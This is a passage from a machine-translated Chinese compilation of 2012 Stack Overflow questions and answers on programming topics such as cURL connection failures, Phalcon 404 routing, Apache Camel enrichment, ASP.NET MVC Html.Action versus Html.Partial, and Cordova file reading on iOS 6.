Protocols   dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, ldaps, pop3,   pop3s, rtsp, smtp, smtps, telnet, tftp
Host    x86_64-unknown-linux-gnu
SSL Version OpenSSL/1.0.0
ZLib Version    1.2.3 
```

它是来自 gatorhost 的专用服务器。我认为是 linux-RedHat-9.8.2。它所说的只是“无法连接到主机”

我们已经确认代码工作正常。（我们从两台主机上进行了测试）。主机本身有一些东西阻止了对白页的访问。cURL 已启用，我们尝试使用备用端口（即... 8080）。另外，尝试建立特定的浏览器标头和用户代理（来自以下帖子） 服务器可以阻止 curl 请求吗？

我们建立的任何东西似乎都没有任何区别......我们也认为这是一个防火墙问题，但我们在这里本地检查并没有问题。我只能认为它在服务器上被阻止了。我们有一个“经销商”专用服务器，可以访问 php.ini 等...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T18:21:19.340

这是OP的队友。我们已经确认代码工作正常。（我们从两台主机上进行了测试）。主机本身有一些东西阻止了对白页的访问。cURL 已启用，我们尝试使用备用端口（即... 8080）。另外，尝试建立特定的浏览器标头和用户代理（来自以下帖子）[服务器可以阻止 curl 请求吗？](https://stackoverflow.com/questions/9391137/can-servers-block-curl-requests)

我们建立的任何东西似乎都没有任何区别......我们也认为这是一个防火墙问题，但我们在这里本地检查并没有问题。我只能认为它在服务器上被阻止了。我们有一个“经销商”专用服务器，可以访问 php.ini 等...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T16:47:42.333

这对我来说看起来不错。

我也运行了你的代码，它似乎工作得很好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T16:49:21.170

打开错误报告`error_reporting(E_ALL);`。也许新服务器没有启用 cURL。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-25T16:49:55.610

它可能会返回错误，但由于您的服务器配置，您没有看到它。尝试将此添加到脚本的顶部

```
error_reporting(E_ALL);
ini_set("display_error", "On"); 
```

# php - 路由不存在时如何添加 404 错误代码？

> ID：12587440
> 
> 赞同：5
> 
> 时间：2012-09-25T16:43:48.200
> 
> 标签：php, routing, http-status-code-404, phalcon

路由不存在时如何抛出 404 错误代码？

在您设置路由信息后的 phalcon 中 - 有没有办法检查进入（来自用户）的路由是否与您的路由列表中的任何路由匹配？然后，如果路由不存在，则抛出 404 错误。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-25T17:00:03.343

你可以使用这样的东西：

```
public function main()
{
    try {

        $this->_registerServices();
        $this->registerModules(self::$modules);
        $this->handle()->send();

    } catch (Exception $e) {

        // TODO log exception

        // remove view contents from buffer
        ob_clean();

        $errorCode = 500;
        $errorView = 'errors/500_error.phtml';

        switch (true) {
            // 401 UNAUTHORIZED
            case $e->getCode() == 401:
                $errorCode = 401;
                $errorView = 'errors/401_unathorized.phtml';
                break;

            // 403 FORBIDDEN
            case $e->getCode() == 403:
                $errorCode = 403;
                $errorView = 'errors/403_forbidden.phtml';
                break;

            // 404 NOT FOUND
            case $e->getCode() == 404:
            case ($e instanceof Phalcon\Mvc\View\Exception):
            case ($e instanceof Phalcon\Mvc\Dispatcher\Exception):
                $errorCode = 404;
                $errorView = 'errors/404_not_found.phtml';
                break;
        }

        // Get error view contents. Since we are including the view
        // file here you can use PHP and local vars inside the error view.
        ob_start();
        include_once $errorView;
        $contents = ob_get_contents();
        ob_end_clean();

        // send view to header
        $response = $this->getDI()->getShared('response');
        $response->resetHeaders()
            ->setStatusCode($errorCode, null)
            ->setContent($contents)
            ->send();
    }
} 
```

如果您使用的是[Micro](http://docs.phalconphp.com/en/latest/reference/micro.html#not-found-handler)组件，则可以使用：

```
$app->notFound(
    function () use ($app) {
        $app->response->setStatusCode(404, "Not Found")->sendHeaders();
        echo 'This is crazy, but this page was not found!';
    }
); 
```

当然，您可以使用其他人发布的有关 .htaccess 文件的建议，但以上是您在 Phalcon 中的操作方法，而无需触及其他任何内容。

管道中还有一个新功能，关于默认错误处理程序，它将处理 Phalcon 中的错误（或在必要时覆盖）。

归功于 Nesbert 的[要点](https://gist.github.com/3701633#L88)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-25T16:47:34.903

设置好 404 页面后，您需要做的就是将访问者发送到此页面的错误 URL。为此，只需将以下行添加到您的 .htaccess 文件中：

```
ErrorDocument 404 /404.php 
```

您可以将 404 错误模板放置在您想要的任何位置。例如，您可以将所有错误消息放在一个名为 errormessages 的文件夹中

```
 ErrorDocument 404 /errormessages/404.php 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T16:48:25.667

如果您想在执行 PHP 脚本时使用默认的 HTTP 404 错误：

```
header("HTTP/1.0 404 Not Found"); 
```

但请记住，这是您发送给客户的第一件事。

如果你不想自定义你的 web 服务器默认的 PHP 错误，那取决于软件。例如，很容易找到 filde apache 用来显示这种错误的方法。

# matlab - matlab：对MyBox有很好的控制，带文本的框

> ID：12587442
> 
> 赞同：1
> 
> 时间：2012-09-25T16:43:59.230
> 
> 标签：matlab, graph, annotations, plot

我的问题是我想要一个框来对图表进行更多更大的评论。如何创建此框，使其始终位于图表外部的右下侧，并且会根据内部文本的数量自动调整其大小？另外，如果我有更长的文本，我需要将它分成更多的行，而不仅仅是一条非常长的行。

我这样使用它，但是我对正在发生的事情的控制很差，这只是在某个地方创建了一定的大小，文本被剪切了..请帮助:)

```
x = rand(110)*100;
y = x;
plot(x,y)
MyBox = uicontrol('style','text')
set(MyBox,'String','optional longer information to be put into diagram')
set(MyBox,'Position',[10,0,40,10]) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T06:59:44.420

恐怕你不能自动做到这一点 - 文本框不使用回调。从文档中：

> 用户不能以交互方式更改静态文本。静态文本控件在单击时不会激活回调例程。

你可以做的是调用 textwrap 函数，它会自动包装你传递给它的文本并返回新的文本框位置：

```
MyBox = uicontrol('style','text');
% set initial position - first three values are kept constant after wrap, the hight can be changed
set(MyBox,'Position',[10,10,30,10])

% adjust the height of your Text box and wrap the text
[outstring,newpos] = textwrap(MyBox,{'optional longer information to be put into diagram'});
% set new position and text
set(MyBox,'Position',newpos, 'String', outstring) 
```

每当您更改文本框中的字符串时，您都必须自己调用 textwrap 和 set(...) 。

# c# - 在 Windows 8 应用程序中平滑滚动？

> ID：12587448
> 
> 赞同：0
> 
> 时间：2012-09-25T16:44:28.773
> 
> 标签：c#, xaml, microsoft-metro

`GridView`我的pageroot里面有一个。它非常宽，滚动效果很好，但它根本不是一种平滑的滚动形式。它以刻度滚动。

如何在我的标记代码中解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T16:47:46.117

嗬！

的`ItemsPanel`属性`GridView`被设置为 a `VirtualizingStackPanel`。更改它以`StackPanel`解决我的问题。

# javascript - 在隐藏其他 div 时切换 div

> ID：12587450
> 
> 赞同：1
> 
> 时间：2012-09-25T16:44:38.110
> 
> 标签：javascript, hide, toggle, show

我在左侧有一个侧面导航，可以进行不同类型的手术。它们都在 ul 中。

当您单击手术 (ul li) 时，右侧会出现一个 div，显示该特定手术的常见问题解答。单击 ul 中的另一个链接将隐藏当前打开的 div 并显示您刚刚单击的那个。

我已经设法做到了，但是当我再次单击相同的 ul li 链接时，我还想切换 FAQ div 的可见性。

```
<html>
<head>
<style>
#popup div { display:none; }
#popup div.show { display:block; }
ul#links li { cursor:pointer;}
</style>
</head>
<body>

    <div class="sidenav">
        <ul id="links">
            <li id="armlift">Arm Lift</li>
            <li id="liposuction">Liposuction</li>
            <li id="tummytuck">Tummy Tuck</li>
            <li id="postgastric">Post-Gastric Bypass Surgery</li>
        </ul>       
    </div>

    <div id="popup">
        <div id="a_armlift">
        <span class="faq_header">Arm Lift</span>
        <p class="treatment_question">What is a an Arm Lift?</p>
            <div class="treatment_answer">This surgery removes excess...</div>
        <p class="treatment_question">What should I know?</p>
            <div class="treatment_answer">An incision is made...</div>
    </div>  
        <div id="a_liposuction">
        <span class="faq_header">Liposuction Lift</span>
        <p class="treatment_question">What is a Liposuction?</p>
            <div class="treatment_answer">Liposuction is the removal...</div>
        <p class="treatment_question">What should I know?</p>
            <div class="treatment_answer">Ideal candidates for...</div>
    </div>
        <div id="a_tummytuck">
        <span class="faq_header">Tummy Tuck</span>
        <p class="treatment_question">What is a Tummy Tuck?</p>
            <div class="treatment_answer">A tummy tuck tightens...</div>
        <p class="treatment_question">What is a Mini Tummy Tuck?</p>
            <div class="treatment_answer">A mini-tuck is a...</div>
        </div>
        <div id="a_postgastric">
        <span class="faq_header">Post-Gastric Bypass Surgery</span>
        <p class="treatment_question">What is a Post-Gastric Bypass Surgery?</p>
            <div class="treatment_answer">Gastric bypass surgery removes...</div>
        <p class="treatment_question">What should I know?</p>
            <div class="treatment_answer">Each patient has...</div>
    </div>
</div>

<script type="text/javascript">
var links_ul = document.getElementById('links');

for (var i = 0; i < links_ul.children.length; i++) {
    links_ul.children[i].onclick = function(ev) {
        s = document.getElementById('a_' + this.id);
        popup = document.getElementsByClassName('show');
        for (var j = 0; j < popup.length; j++) {
            popup[j].className = '';
        }
        s.className = 'show';
    };
}
</script>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:33:08.433

我建议考虑以不同的方式执行此操作。有很多插件可以做这种事情。

但是，这是您问题的答案：http: [//jsfiddle.net/6Vku8/1/](http://jsfiddle.net/6Vku8/1/)

```
for (var i = 0; i < links_ul.children.length; i++) {
    links_ul.children[i].onclick = function(ev) {
        s = document.getElementById('a_' + this.id);
        popup = document.getElementsByClassName('show');
        var shown = s.className == 'show';

        for (var j = 0; j < popup.length; j++) {
            popup[j].className = '';
        }
        s.className = shown ? '' : 'show';
    };
}​ 
```

在隐藏所有 div 之前，您需要确定 div 是否“显示”。

# file - 在 Cordova 2.0 应用程序上 - readAsText 在 iOS6 上中断...

> ID：12587451
> 
> 赞同：1
> 
> 时间：2012-09-25T16:44:42.563
> 
> 标签：file, cordova, ios6

我正在开发一个 Phonegap/Cordova 应用程序，使用 Cordova 2.0，并且在 iOS 6 可用后 - 我们突然开始遇到问题。它在文件对象的 readAsText 方法中。

这是代码的一部分。我们使用 facebook SDK 发布 Facebook Single Sign-On，所以我们有一个文件，写在一个文件夹中。然后我们尝试读取它并从中获取令牌。

等等 - 在 iOS 4 和 iOS5 上它正在工作 - 即你会看到两个警报 - 111 和 222。但在 iOS6 上，第二个警报不会发生。或者换句话说 - onloadend 回调永远不会触发，尽管我看到文件在那里。

```
// start the file interaction:
window.requestFileSystem(

    LocalFileSystem.PERSISTENT,
    0,
    function(fileSystem) {

        fileSystem.root.getFile(

            "FacebookData/facebookData",
            null,
            function(fileEntry) {

                fileEntry.file(

                    function(file) {

                        alert('111');

                        var reader = new FileReader();

                        reader.onloadend = function(evt) {

                            alert('222');

                            // do something with the file .. 

                        }; // end of onloadend

                        reader.readAsText(file);
                    },

                    fail
                ); // end fileEntry.file

            },
            fail

        ); // end getfile

    },
    fail

); // end window.requestFileSystem 
```

函数“fail”根本不会触发，而且——所有这些都在 try-catch 中——但它也不会抛出异常。

而且 - 在 iOS 4/5 上它只发生一次，但在 iOS 6 上它发生了几次，就好像你在一个按钮上单击了几次然后代码执行。

有没有人遇到过这样的bug？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T12:25:14.180

已知问题，显然有一个修复： [https ://issues.apache.org/jira/browse/CB-1219](https://issues.apache.org/jira/browse/CB-1219)

[https://github.com/apache/incubator-cordova-js/pull/22](https://github.com/apache/incubator-cordova-js/pull/22)

但我还没有测试它。

# c# - 你什么时候使用 Html.Action 而不是 Html.Partial

> ID：12587454
> 
> 赞同：13
> 
> 时间：2012-09-25T16:44:57.820
> 
> 标签：c#, asp.net-mvc

我仍然没有得到 `Html.Action`在 asp.net mvc 中的主要目的。`Html.Partial`每次我需要加载部分视图或想要在视图中拆分一些代码以清理它时，我一直在使用它。

哪里`Html.Action`适合所有这些（例如，您想在哪里使用`Html.Action`和*不*使用`Html.Partial`）？

**编辑**

答案似乎是将 Html.Action 用于动态数据。我不明白这一点，因为您也可以将部分视图用于动态数据。

例如，如果我网站上的用户编辑了一行。对一个方法进行了 ajax 调用，然后我从数据库中获取该行。然后，我返回一个表单的部分视图，其中包含所有数据可供编辑。如果发生错误，我会使用错误方法返回一个 json 结果，我的 javascript 会使用它并提醒用户。

如果一切正常，则将呈现的 html 放入 jquery 对话框并显示给用户。

是不是因为你可以使用“ChildActionOnlyAttribute”让人们改用Action？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-25T17:24:34.070

Ankur 的想法是正确的，但我发现你真的可以进一步简化这个概念。

对我来说，它归结*为什么*与*如何*

如果您知道**要**渲染的内容但不**知道如何**渲染，您可能会使用 partial 来决定如何渲染信息。例如，也许您的视图模型用于发票。您的发票视图模型可能已经包含您需要的有关发票本身的所有信息，可能包括发票上的可枚举行项目。对于行项目，部分可能是一个不错的选择，因此它是自包含的。您已经有了订单项详细信息（**what**），但部分将处理它的呈现方式（**how**）

另一方面，也许您的发票视图模型上有一个客户 ID，但没有实际的客户详细信息。在这里，您没有**what**，因此您将客户 ID 传递给 Action ，它将获取所需**的**数据并将其传递给视图以呈现**它**看起来合适的方式。

因此，总而言之，如果您已经拥有想要使用的所有数据，只需坚持使用 Partial，但如果您缺少需要获取的信息，Action 会更好。

当局部视图包含通过 Ajax（或其他技术）检索其自己的数据的能力时，边缘变得非常模糊。在这种情况下，您可以在我的示例中将客户详细信息部分设置为 Partial，并让它在客户端获得响应后使用 Ajax 检索所需的数据。但是，如果这种事情对您的实施有意义，那就更取决于您了。

**附录：** 值得注意的是，如果您决定试用 ASP.NET MVC Core，则 ChildActions 不再可用。在这种情况下，您的选择将仅限于局部视图、ajax 或新引入的[组件](https://docs.microsoft.com/en-us/aspnet/core/mvc/views/view-components)功能。最后一个类似于 ChildActions，但在实现方式上略有不同。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T22:31:14.687

也许举个例子可以更清楚地说明这一点。

假设您有一个出现在每个页面上的菜单，因此您将其放入布局中。菜单永远不会改变——只有一些基本的导航链接，主页、关于、联系我们等，所以您只需使用普通的局部视图。这会很好 - 因为内容是静态的 - 你不需要去数据库来获取数据。你可以只使用`@Html.Partial("Menu");`.

稍后您决定需要更改菜单，以便它从数据库中获取所有链接。您更新您的局部视图以具有一个模型，该模型是一个`List<string>`- 每个链接的模型。

现在，如果您仍然只想使用部分视图，则每个操作都需要查询数据库以获取链接列表，并且每个视图的每个模型都需要具有`List<string>`链接的属性，以便它可以传递这个到菜单部分视图。这将是一个坏主意。

相反，您将创建一个新的 Child Action `GetMenuLinks()`- 这将查询数据库以获取链接作为 a `List<string>`，并将其传递给 Partial View。这让 Child Action 负责获取它自己的数据。这意味着您只需要在一个地方进行此查询，例如“关于我们”操作不需要担心获取菜单的链接列表。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-06-22T09:52:22.887

**部分视图** 用于在视图之间共享视图标记的子部分。局部视图可以包含内联代码、HTML 辅助方法以及对其他局部视图的引用。部分视图不调用操作方法，因此它们不能用于执行业务逻辑。

**子操作** 用于创建需要包含业务逻辑的可重用 UI 控件或小部件。当您使用子操作时，它会调用操作方法、呈现视图并将结果注入响应流。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-25T18:13:18.267

This question is answered (and *elected for 149 times* !) here:

[Html.Partial vs Html.RenderPartial & Html.Action vs Html.RenderAction](https://stackoverflow.com/questions/5248183/html-partial-vs-html-renderpartial-html-action-vs-html-renderaction)

**更新** 对不起，本打算向您发送这些帖子，而不是

*   [MVC Html.Partial 或 Html.Action](https://stackoverflow.com/questions/11766554/mvc-html-partial-or-html-action) \
*   [@Html.Partial() 与 @Html.Action() - MVC 剃刀](http://pratapreddypilaka.blogspot.ca/2011/11/htmlpartial-vs-htmlaction-mvc-razor.html)

希望这可以帮助。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-25T16:56:13.747

我`Html.Action()`用来加载我不希望包含在视图模型中的动态内容（例如，侧边栏中的用户信息）。它对于保持输入和输出视图模型相同非常有用。

请注意，我总是将`Html.Action()`与应用`ChildActionOnlyAttribute`到我正在调用的控制器方法结合使用，这样 HTML 片段就不能通过 URL 访问。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-25T18:20:28.500

当您需要视图模型的一个子集来呈现有问题的部分时，请使用 Html.Partial - 通常它与您正在处理的内容有关。如果可以是表单的子部分、与主视图相关的相关内容片段等。部分从父视图接收其模型信息。

否则，请使用 Html.Action 呈现独立于主视图的内容，例如导航片段、旁白或其他干扰。Html.Action 使用其控制器提供的自己的模型，而不是由父视图提供。

# intellij-idea - 使用 IntelliJ 撤消 CVS 提交？

> ID：12587456
> 
> 赞同：2
> 
> 时间：2012-09-25T16:45:19.543
> 
> 标签：intellij-idea, cvs

我刚刚将一堆（嗯，11 个）文件提交到我们的 CVS 存储库中，但对它们的注释错误。有没有办法撤销这个提交，以便我可以用正确的评论重新提交它们？

或者，有没有一种方法可以强制重新提交，而无需返回并修改每个文件，以便 IntelliJ 将文件视为“已更改”？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T20:38:21.927

似乎没有简单的方法可以回滚，除非使用命令行客户端： [How to revert to previous commit in CVS](https://stackoverflow.com/questions/9153984/how-to-revert-to-previous-commit-in-cvs)

在 Intellij Idea 中没有明显的方法可以做到这一点。

# apache-camel - Apache Camel：在路由结束时访问请求和回复消息

> ID：12587457
> 
> 赞同：7
> 
> 时间：2012-09-25T16:45:21.417
> 
> 标签：apache-camel

我想在路由结束时处理请求和响应消息。但是，我看不到如何访问原始请求消息的方法。

我有一种可怕的感觉，我正在为一些基本概念而苦苦挣扎。

这是 DSL 中的一个简单示例路由，用于概述我的问题（为整个上下文启用了流缓存）：

```
from("activemq:queue:myQueue")
.to("log:" + getClass().getName() + "?showOut=true")
.to("http://localhost:8080/someBackend")
.log("Now in.Body returns this: ${in.body} and out.Body this: ${out.body}")
.to("log:" + getClass().getName() + "?showOut=true"); 
```

这是我的日志的相应摘录（为了更好地阅读而编辑了换行符）。可以看到，一旦 http 服务器回复，原始的 SOAP 消息就丢失了，SOAP 响应对象存储在消息的 inBody 中。

```
2012-09-25 17:28:08,312 local.bar.foo.MyRouteBuilder INFO - 
    Exchange[ExchangePattern:InOut, BodyType:byte[],
    Body:<?xml version="1.0" encoding="UTF-8"?><env:Envelope xmlns:env="http://schemas.xmlsoap.org/soap/envelope/"><env:Header /><env:Body><urn:someRequest  xmlns:urn="http://foo.bar.local/ns"></urn:someRequest></env:Body></env:Envelope>, 
    Out: null]
2012-09-25 17:28:08,398 org.apache.camel.component.http.HttpProducer DEBUG - 
    Executing http POST method: http://localhost:8080/someBackend
2012-09-25 17:28:09,389 org.apache.camel.component.http.HttpProducer DEBUG - 
    Http responseCode: 200
2012-09-25 17:28:09,392 route2 INFO - 
    Now in.Body returns this: <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:someResponse xmlns:ns2="http://foo.bar.local/ns"</ns2:someResponse></soap:Body></soap:Envelope>
    and out.Body this: 
2012-09-25 17:28:09,392 local.bar.foo.MyRouteBuilder INFO - 
    Exchange[ExchangePattern:InOut,  
    BodyType:org.apache.camel.converter.stream.InputStreamCache,
    Body:[Body is instance of org.apache.camel.StreamCache],
    Out: null] 
```

我本来希望在整个路线上保留 in.body 和 out.body ？

**我正在考虑的替代解决方案：**

*   利用[Correlation Identifier](http://camel.apache.org/correlation-identifier.html)模式来关联请求和回复。但这也会保留消息正文吗？此外，我的请求/回复消息没有用于关联的唯一标识符。
*   编写一个自定义 bean，它执行对 http 后端的调用，同时处理请求和回复对象（但这基本上是一个非 Camel 解决方案，重新发明轮子，因此不是首选）

**已经失败的方法：**

我尝试在路由结束时使用这样的处理器访问原始请求消息，但没有成功：

```
 process(new Processor() {
   @Override
   public void process(Exchange exchange) throws Exception {
      Message originalInMessage = exchange.getUnitOfWork().getOriginalInMessage();
         logger.debug(originalInMessage.getBody(String.class));
         logger.debug(exchange.getIn().getBody(String.class));
   }
 }); 
```

谢谢你的帮助

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-26T06:04:08.550

只需将 in 消息的原始正文存储在标头或属性中并在最后检索它：

```
from("activemq:queue:myQueue")
.setProperty("origInBody", body())
.to("http://localhost:8080/someBackend") 
```

在 http 调用之后，您可以访问属性 origInBody。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-09-25T19:52:15.480

首先，这篇文章很好地展示了骆驼的进出方式：http: [//camel.apache.org/using-getin-or-getout-methods-on-exchange.html](http://camel.apache.org/using-getin-or-getout-methods-on-exchange.html)

通常，并不总是使用 out 消息，而是在每个步骤中从 in 消息中复制。

在您的情况下，您希望原始消息一直保留到路由结束，您可以继续使用 Enrichment EIP。[http://camel.apache.org/content-enricher.html](http://camel.apache.org/content-enricher.html)

您的路线将是这样的：

```
public class MyAggregationStrategy implements AggregationStrategy {
  public Exchange aggregate(Exchange orig, Exchange httpExchange){
    // if you want to check something with the Http request, you better do that here 
    if( httpExchange is not correct in some way ) 
       throw new RuntimeException("Something went wrong");

    return orig;
  }
}

AggregationStrategy aggStrategy = new MyAggregationStrategy();

from("activemq:queue:myQueue")
  .enrich("http://localhost:8080/someBackend",aggStrategy)
  .//keep processing the original request here if you like, in the "in" message 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2018-07-19T12:16:11.913

**骆驼最大的问题之一，就是容易误用**。正确使用它的最好方法是从 EIP 的角度来思考：**camel 的主要目标之一是在其 DSL 中实现 EIP**。

[这是EIP的列表](http://camel.apache.org/eip.html)

现在想想。你想要最后的请求和响应，有什么用？记录，聚合，... ? 对于日志记录，correlationId 就足够了，所以我认为您需要它来创建响应，基于请求和代理响应。如果这就是你想要的，你可以做类似的事情

```
from("direct:receiveRequest")
   .enrich("direct:proxyResponse", new RequestAndResponseAggregationStrategy()) 
```

您将有机会合并您的请求（在 oldExchange 中）和您的响应（在 newExchange 中）。

尽管我对 Christian Schneider 给予了应有的尊重，**但我确实认为将请求放在可以稍后重用的属性中的想法是一个糟糕的设计**。通过这样做，您会在路线之间产生副作用。如果您的路线是另一个路线的子路线，您可能会删除他们的财产。如果你把它存储起来以后放回去，也许你应该做类似的事情

```
from("direct:receiveRequest")
    .enrich("direct:subRouteToIgnoreResponse", AggregationStrategies.useOriginal()) 
```

我自己做了太多次的一个非常糟糕的设计是：

```
from("direct:receiveRequest")
    .to("direct:subroute")

from("direct:subroute")
    .setProperty("originalBody", body())
    .to("direct:handling")
    .transform(property("originalBody") 
```

**这将导致“属性/标题地狱”，以及只是处理器的连续调用的路由。**

**如果你想不出 EIP 问题的解决方案，你应该只使用骆驼来访问他们的组件**。例如，类似：

```
from("http://api.com/services")
   .to(new SomeNotTranslatableToEIPProcessor())
   .to("ftp://destination") 
```

但是不要忘记这些组件有它们自己的目标：在相似行为之间创建一个通用抽象（例如，基于时间的轮询消费者）。如果您有非常特定的需求，尝试将骆驼组件弯曲到这种特定需求可能会导致大量代码不易维护。

不要让 Camel 成为你的[金锤反模式](https://sourcemaking.com/antipatterns/golden-hammer)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-05-13T13:54:45.787

我经常使用聚合策略，它保留旧的交换并将丰富的结果放入标题中：

```
import org.apache.camel.Exchange;
import org.apache.camel.processor.aggregate.AggregationStrategy;

public class SetBodyToHeaderAggregationStrategy implements AggregationStrategy {

    private String headerName = "newBody";

    public Exchange aggregate(Exchange oldExchange, Exchange newExchange) {
        oldExchange.getIn().setHeader(headerName, newExchange.getIn().getBody());

        return oldExchange;
    }

    @SuppressWarnings("unused")
    public void setHeaderName(String headerName) {
        this.headerName = headerName;
    }

} 
```

现在你可以像这样使用它：

```
<enrich strategyRef="setBodyToHeaderAggregationStrategy">
  <constant>dosomething</constant>
</enrich>

<log loggingLevel="INFO" message="Result body from enrich: ${header.newBody}. Original body: ${body}" loggerRef="log"/> 
```

# c# - 根据用户 ID/文本框搜索类并在表中显示类

> ID：12587458
> 
> 赞同：1
> 
> 时间：2012-09-25T16:45:21.950
> 
> 标签：c#, html, asp.net-mvc-3

Aspx 引擎

我有一个要求用户输入用户 ID 的网络表单。假设用户 id 搜索类并显示与用户 id 匹配的类。

现在出现的问题是，当我输入用户 ID 时，会显示所有类。假设只显示类。具有在文本框中输入的 userId 的类

**html**

```
<div align="center">
    <form id="searchUser" method="post" action="Search">
        <table align="center">
    <tr>
        <td class="label">
            Enter ID:
        </td>
        <td>
            <input type="text" name="UserId" id="UserId" value="<%=(string)(ViewBag.userid)%>" />
        </td>
    </tr>
      <tr style ="display:none;">
        <td class="label">
            Email:
        </td>
        <td>
            <input type="text" name="Email" id="Text1" value="<%=(string)(ViewBag.email)%>" />
        </td>
    </tr>
      <tr style ="display:none;">
        <td class="label">
            lastFourDigits:
        </td>
        <td>
            <input type="text" name="LastFourDigits" id="Text2" value="<%=(string)(ViewBag.lastFourDigits)%>" />
        </td>
    </tr>
    <tr>
        <td>
            <button class="searchButton" id="searchButton">Search</button>
        </td>
    </tr>
  </table>
 </form>
  </div>
  <hr /> 

  <% if (ViewBag.searchClass !=null)
    { %>
    <h2>Search Resuls</h2>
    <br />
    <%List<AAlexUsers.Models.SearchClass> searchClassList= ViewBag.searchClass;%>
    <%if(searchClassList.Count>0)
    <table>
          <%foreach (AAlexUsers.Models.SearchClass searchClass in searchClassList)
     {%>
      <tr>
         <td>
            UserID:
        </td>
        <td class="content">
          <%=searchClass.userId%>
        </td>
    </tr>
    <tr>
        <td>
            Email:
        </td>
        <td class="content">
         <%=searchClass.email%>
        </td>
    </tr>
    <tr>
        <td>
        Last Four Digits:
        </td>
        <td class="content">
          <%=searchClass.lastFourdigits%>
         </td>
    </tr>
    <%} %>
    <%} %>
 </table>

    <%} else %>
 <%{ %>
    <h2>No Class found.</h2>
 <%} %> 
```

**控制器**

```
 public ActionResult Search()
    {
        string userId = Request["UserId"];
        string email = Request["Email"] ?? string.Empty;
        string lastFourdigits = Request["LastFourDigits"] ?? string.Empty;

        bool view = false;

        if (string.IsNullOrEmpty(userId))
        {
            view = true;
        }
        if (!view)
        {
            List<AAlexUsers.Models.SearchClass> searchClass = AAlexUsers.Models.SearchClass.Users(userId,email,lastFourdigits);
            {
                ViewBag.searchClass = searchClass;
                ViewBag.lastFourdigits = lastFourdigits;
                ViewBag.userId = userId;
                ViewBag.email = email;

            }
        }
        return View();
    } 
```

**模型**

```
 public class SearchClass
{
    public string userId { get; set; }
    public string email { get; set; }
    public string lastFourdigits { get; set; }

    public static List<AAlexUsers.Models.SearchClass>Users(string userId, string email, string lastFourdigits)   
    {
        SearchClass Alex = new SearchClass();
        Alex.userId = "1234";
        Alex.email = "Alex@gmail.com";
        Alex.lastFourdigits = "1885";

        SearchClass Emilio = new SearchClass();
        Emilio.userId = "0928";
        Emilio.email = "Cubano@gmail.com";
        Emilio.lastFourdigits = "0706";

        SearchClass Ulysses = new SearchClass();
        Ulysses.userId = "0914";
        Ulysses.email = "lysses@gmail.com";
        Ulysses.lastFourdigits = "01zx";

        var list = new List<SearchClass>();
        list.Add(Alex);
        list.Add(Emilio);
        list.Add(Ulysses);

        return list;

    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T17:54:37.097

我希望这能为您指明正确的方向。

```
public class SearchClass
{
    public string userId { get; set; }
    public string email { get; set; }
    public string lastFourdigits { get; set; }

    public static List<SearchClass> Users(string userId, string email, string lastFourdigits)   
    {
        SearchClass Alex = new SearchClass();
        Alex.userId = "1234";
        Alex.email = "Alex@gmail.com";
        Alex.lastFourdigits = "1885";

        SearchClass Emilio = new SearchClass();
        Emilio.userId = "0928";
        Emilio.email = "Cubano@gmail.com";
        Emilio.lastFourdigits = "0706";

        SearchClass Ulysses = new SearchClass();
        Ulysses.userId = "0914";
        Ulysses.email = "lysses@gmail.com";
        Ulysses.lastFourdigits = "01zx";

        var list = new List<SearchClass>();
        list.Add(Alex);
        list.Add(Emilio);
        list.Add(Ulysses);

        IEnumerable<SearchClass> result = list;
        if(!string.IsNullOrEmpty(userId))
            result = result.Where(u => u.userId == userId);
        if(!string.IsNullOrEmpty(email))
            result = result.Where(u => u.email == email);
        if(!string.IsNullOrEmpty(lastFourdigits))
            result = result.Where(u => u.lastFourdigits == lastFourdigits);

        return result.ToList();
    } 
```

# php - 使用 php 从 apache 服务器 red hat 写一个文本文件

> ID：12587460
> 
> 赞同：1
> 
> 时间：2012-09-25T16:45:25.953
> 
> 标签：php, linux

我已经阅读了一些非常相似的其他答案，但我的问题是创建了文本文件但仍然为空。
我没有收到任何错误消息。相同的代码在 Windows 服务器上完美运行。
权限没问题：“apache”用户创建文本文件但是......

有谁能够帮我？
服务器 apache 2.2
红帽 6
PHP 5

还有什么？
好的，代码

* * *

```
$oggi=date("Y").date("m").date("d").date("H").date("i").date("s");  
$file = "Business_Case_".$oggi.".xml";  
$f_handle = fopen($file, 'w');  
$sql = "select * from bc_inizio";  
$res = mysql_query($sql, $conn);  
while ($arrow = mysql_fetch_array($res, MYSQL_ASSOC)) {  
    $friga = hex2bin($arrow['riga'])."\n";  
    fwrite($f_handle, $friga);  
}  
fclose($f_handle); 
```

* * *

“mysql_affected_rows”正确返回，选择了 1178 行！

# android - 应用对象的序列化

> ID：12587461
> 
> 赞同：0
> 
> 时间：2012-09-25T16:45:31.553
> 
> 标签：android, offline-caching, data-consistency

起初我有很强的 Java 知识，但刚开始接触 Android。

我的 Android 应用程序正在下载一些相当复杂的数据（文本、日期、图像），我将这些数据保存在自定义对象中。数据需要不时刷新。但是通常下载的数据不会改变。

